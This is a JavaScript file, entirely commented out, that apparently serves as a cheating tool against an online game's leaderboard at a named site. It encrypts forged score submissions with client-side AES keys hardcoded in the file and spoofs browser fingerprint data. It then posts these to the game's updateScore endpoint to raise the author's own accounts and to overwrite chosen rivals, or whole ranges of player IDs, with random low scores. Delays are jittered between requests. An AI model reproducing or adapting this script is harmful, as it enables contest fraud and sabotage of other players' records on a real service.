
// // ==========================================================================================
// // ==========================================================================================

// function update_score() {
//     let userId = parseInt(document.getElementById('textbox1').value);
//     let score = parseInt(document.getElementById('textbox2').value);

//     console.debug("Called update_score with user: " + userId + ", score: " + score);
//     return update_score_impl(userId, score);
// }

// function update_score_impl(new_uid, new_score) {
//     let form_data = new FormData();
//     let USIDCTR = CryptoJSAesJson.encrypt(new_uid, "3hgqH9qSDtJxvlJ54fCqmPsDMw5bjSWze5pQER7tweHyts7ZQjrMqleHWj6i3dxYFUHx");
//     let SCRCTR = CryptoJSAesJson.encrypt(new_score, "3hgqH9qSDtJxvlJ54fCqmPsDMw5bjSWze5pQER7tweHyts7ZQjrMqleHWj6i3dxYFUHx");
//     let SCRCJR = CryptoJSAesJson.encrypt(new_score, 'XyMwknpvyaQFDoL6aELw8eeFxg7VBkElnaanWPEzQzqfUvQbRc6KLNfeyrd56JZPiKQzUzsyA4uAmHykHTEXyE6SJGCmpmGTToa5fyDmm');
//     // let _0x42bfc0 = navigator.userAgent + " /// " + window.screen.availHeight + 'x' + window.screen.availWidth + " /// " + screen.height + 'x' + screen.width + " /// " + window.screen.width * window.devicePixelRatio + 'x' + window.screen.height * window.devicePixelRatio;
//     let _0x42bfc0 = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 /// 1040x1920 /// 1080x1920 /// 1920x1080';
//     let _0x50d299 = CryptoJSAesJson.encrypt(_0x42bfc0, "3hgqH9qSDtJxvlJ54fCqmPsDMw5bjSWze5pQER7tweHyts7ZQjrMqleHWj6i3dxYFUHx");
//     form_data.append("playerId", USIDCTR);
//     form_data.append("score", SCRCTR);
//     form_data.append("token", SCRCJR);
//     form_data.append('data', _0x50d299);
//     var req = new XMLHttpRequest();
//     req.open('POST', 'https://tictac-winter.co.il/index.php/updateScore', true);
//     req.onload = function () {
//         console.debug(this.responseText);
//         let _0x443239 = JSON.parse(this.responseText);
//         if (_0x443239.success) {
//             console.debug("***** Results: ");
//             for (let i = 0; i < 5; i++) {
//                 console.debug(i.toString() + " place: " + _0x443239.topPlayers[i].fullname);
//             }
//             console.debug("position: " + _0x443239.myPosition);
//             return _0x443239;
//         }
//     };
//     req.send(form_data);
// }

// // ==========================================================================================
// // ==========================================================================================

// function remove_annoying_users() {
//     let annoying_users_str = document.getElementById('textbox3').value;
//     let annoying_users = annoying_users_str.split(',').map(num => parseInt(num.trim()));
    
//     console.debug("Called remove_annoying_users: " + annoying_users_str);
//     remove_annoying_users_impl(annoying_users);
// }

// async function remove_annoying_users_impl(annoying_users) {
//     console.debug("============= Current time =============");
//     console.debug(new Date().toString());

//     // Set my own users
//     console.debug("Overwriting " + 19603);
//     update_score_impl(19603, 1420);
//     await new Promise(r => setTimeout(r, 2000));
//     console.debug("Overwriting " + 19604);
//     update_score_impl(19604, 1370);
//     await new Promise(r => setTimeout(r, 2000 + 250));
//     console.debug("Overwriting " + 21246);
//     update_score_impl(21246, 1250);
//     await new Promise(r => setTimeout(r, 2000 + 500));

//     // Remove the annoying users
//     annoying_users.forEach(async u => {
//         console.debug("Overwriting " + u);
//         update_score_impl(u, 50 + (Math.round(Math.random() * 45) * 10));
//         // await new Promise(r => setTimeout(r, 1000));
//     });
// }

// // ==========================================================================================
// // ==========================================================================================

// function reset_users_chunk() {
//     let start = parseInt(document.getElementById('textbox4').value);
//     let count = parseInt(document.getElementById('textbox5').value);
//     let end = start - count;

//     console.debug("Calling reset_users_range, start: " + start + "end: " + end);
//     reset_users_range_impl(start, end);
// }

// function reset_users_range() {
//     let start = parseInt(document.getElementById('textbox6').value);
//     let end = parseInt(document.getElementById('textbox7').value);

//     console.debug("Calling reset_users_range, start: " + start + "end: " + end);
//     reset_users_range_impl(start, end);
// }

// async function reset_users_range_impl(start, end) {
//     // Now, send the messages
//     for (let i = start; i >= end; i--) {
//         // Create the form data (playerId, score, token, data)
//         console.debug("Overwriting: " + i);
//         update_score_impl(i, 50 + (Math.round(Math.random() * 45) * 10));
//         await new Promise(r => setTimeout(r, 1000 + Math.floor(Math.random() * 100)));
//     }
// }

// // ==========================================================================================
// // ==========================================================================================